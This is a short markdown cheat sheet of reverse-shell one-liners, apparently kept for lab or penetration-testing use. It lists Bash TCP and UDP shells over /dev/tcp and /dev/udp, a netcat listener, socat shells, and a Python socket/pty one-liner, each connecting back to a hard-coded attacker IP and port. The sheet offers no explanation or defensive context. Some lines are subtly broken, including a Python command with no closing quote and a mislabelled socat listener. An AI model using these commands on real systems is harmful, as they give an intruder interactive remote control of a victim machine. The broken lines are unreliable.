## Table of Contents

- [Rev Shells Bruh](#rev\shells\bruh)
      - [Bash TCP](#Bash\TCP)
      - [Bash UDP](#Bash\UDP)
      - [Socat](#Socat)
      - [Python](#Python)

# Rev Shells Bruh

#### Bash TCP
```bash
bash -i >& /dev/tcp/10.10.16.6/6969 0>&1

0<&196;exec 196<>/dev/tcp/10.6.34.114/6969; sh <&196 2>&196

/bin/bash -l /dev/tcp/10.5.34.114/6969 0<&1 2>&1

```

#### Bash UDP

```shell
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

#### Socat
```shell
user@VICTIM_MACHINE$ socat file:`tty`,raw,echo=0 TCP-L:4242
user@VICTIM_MACHINE$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.34.114:6969
```

#### Python
```Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```
